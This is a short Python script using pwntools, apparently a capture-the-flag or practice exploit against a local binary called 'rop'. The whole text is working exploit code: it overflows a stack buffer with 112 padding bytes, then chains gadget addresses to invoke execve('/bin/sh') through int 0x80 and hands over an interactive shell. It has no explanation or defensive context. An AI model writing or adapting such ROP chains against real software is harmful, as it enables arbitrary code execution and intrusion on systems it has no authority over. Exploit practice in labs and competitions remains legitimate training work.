from pwn import *

p = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
str_bin_sh = 0x080be408
int_0x80 = 0x08049421

rop = p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(str_bin_sh) + p32(int_0x80)

payload = 112 * b'A' + rop

p.sendline(payload)
p.interactive()